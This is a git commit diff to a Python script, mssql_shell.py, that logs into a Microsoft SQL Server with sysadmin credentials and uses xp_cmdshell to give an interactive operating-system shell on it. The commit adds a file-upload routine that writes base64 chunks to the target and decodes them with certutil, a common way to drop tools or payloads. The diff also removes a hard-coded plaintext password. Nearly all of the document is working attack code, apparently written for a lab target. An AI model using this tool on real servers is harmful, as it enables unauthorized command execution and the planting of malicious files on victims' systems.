553c738256ef752466e41a6a84ea199b58e62cd4
alamot <antalamot@gmail.com>
2018-04-09 19:58:14 +0300

    Automatic commit Mon Apr  9 19:58:14 EEST 2018

--- mssql/mssql_shell.py
+++ mssql/mssql_shell.py
@@ -3,50 +3,96 @@ from __future__ import print_function
 
 # Author: Alamot
 # Use pymssql >= 1.0.3 (otherwise it doesn't work correctly)
+# To upload a file type: UPLOAD local_path remote_path
+# e.g. UPLOAD myfile.txt C:\temp\myfile.txt
+# If you omit the remote_path it uploads the file on the current working folder.
 import _mssql
+import base64
+import shlex
 import sys
-from pwn import *
-from base64 import b64encode
+import tqdm
+import hashlib
 
 MSSQL_SERVER="10.13.38.11"
-sa_MSSQL_USERNAME = "sa_user1"
-sa_MSSQL_PASSWORD = "PickAStr0ng0ne$Passw0rd"
+MSSQL_USERNAME = "sa_user"
+MSSQL_PASSWORD = "**********"
+BUFFER_SIZE = 5*1024
 TIMEOUT = 30
 
 
-def print_result(mssql):
-    for row in list(mssql)[:-1]:
-        for column in row.keys()[:-1]:
-            print(row[column], end=' ')
-        print("")
+def process_result(mssql):
+    username = ""
+    computername = ""
+    cwd = ""
+    rows = list(mssql)
+    for row in rows[:-3]:
+        columns = row.keys()
+        print(row[columns[-1]])
+    if len(rows) >= 3:
+        (username, computername) = rows[-3][rows[-3].keys()[-1]].split('|')
+        cwd = rows[-2][rows[-3].keys()[-1]]
+    return (username.rstrip(), computername.rstrip(), cwd.rstrip())
 
+
+def upload(mssql, stored_cwd, local_path, remote_path):
+    print("Uploading "+local_path+" to "+remote_path)
+    cmd = 'type nul > "' + remote_path + '.b64"'
+    mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
+
+    with open(local_path, 'rb') as f:
+        data = f.read()
+        md5sum = hashlib.md5(data).hexdigest()
+        b64enc_data = "".join(base64.encodestring(data).split())
+        
+    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
+    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
+        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
+        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
+        #print("Remaining: "+str(len(b64enc_data)-i))
+
+    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
+    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
+    process_result(mssql)
+    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
+    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
+    if md5sum in [row[row.keys()[-1]].strip() for row in mssql if row[row.keys()[-1]]]:
+        print("MD5 hashes match: " + md5sum)
+    else:
+        print("ERROR! MD5 hashes do NOT match!")
 
 def shell():
     mssql = None
+    stored_cwd = None
     try:
-        mssql = _mssql.connect(server=MSSQL_SERVER, user=sa_MSSQL_USERNAME, password=sa_MSSQL_PASSWORD)
-        log.success("Successful login at mssql server "+MSSQL_SERVER+", username '"+sa_MSSQL_USERNAME+"' and password '"+sa_MSSQL_PASSWORD+"'")
+        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
+        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)
 
-        cmd = "whoami"
-        mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")
-        print_result(mssql)
+        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
+        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
+        (username, computername, cwd) = process_result(mssql)
+        stored_cwd = cwd
         
         while True:
-            cmd = raw_input("> ").rstrip("\n")
+            cmd = raw_input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n")
             if cmd.lower()[0:4] == "exit":
                 mssql.close()
-                return                
+                return
+            elif cmd[0:6] == "UPLOAD":
+                upload_cmd = shlex.split(cmd, posix=False)
+                if len(upload_cmd) < 3:
+                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
+                else:
+                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
+                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
+            mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
+            (username, computername, cwd) = process_result(mssql)
+            stored_cwd = cwd
             
-            mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")
-            print_result(mssql)
-            
-        
     except _mssql.MssqlDatabaseException as e:
         if  e.severity <= 16:
-            log.failure("MSSQL failed: "+str(e))
+            print("MSSQL failed: "+str(e))
         else:
             raise
-            
     finally:
         if mssql:
             mssql.close()
